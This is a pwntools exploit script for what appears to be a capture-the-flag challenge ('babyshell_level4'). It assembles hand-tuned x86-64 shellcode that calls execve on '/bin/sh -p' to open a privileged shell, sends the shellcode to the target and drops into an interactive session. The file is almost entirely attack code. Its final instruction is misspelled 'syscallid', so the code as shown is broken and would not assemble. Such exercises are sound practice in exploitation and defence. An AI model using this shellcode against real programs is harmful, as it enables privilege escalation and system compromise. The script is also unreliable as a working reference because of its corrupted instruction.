from pwn import *

elf = context.binary = ELF('/challenge/babyshell_level4')
#context.log_level = 'debug'

#p = process((["strace", "/challenge/babyshell_level4"]))
p = process()

shellcode = asm('''
    /* execve(path='/bin///sh', argv=['sh','-p'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    //mov rax, 0x732f2f2f6e69622f
    //push rax
    push 0x6e69622f
    mov dword ptr [rsp+4],0x732f2f2f
    //mov rdi, rsp
    push rsp
    pop rdi
    /* push argument array ['sh\x00', '-p\x00'] */
    /* push b'sh\x00-p\x00' */
    //mov rax, 0x702d006873
    //push rax
    push 0x2d006873
    mov dword ptr [rsp+4],0x70
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    //push 0xb
    //pop rsi
    //add rsi, rsp
    push rsp
    add dword ptr [rsp],0xb
    //pop rsi
    //push rsi /* '-p\x00' */
    //push 0x10
    //pop rsi
    //add rsi, rsp
    //push rsi /* 'sh\x00' */
    push rsp
    add dword ptr [rsp],0x10
    //mov rsi, rsp
    push rsp
    pop rsi
    xor edx, edx /* 0 */
    /* call execve() */
    push 0x3b /* 0x3b */
    pop rax
    syscallid
    ''')
p.sendline(shellcode)

p.interactive()
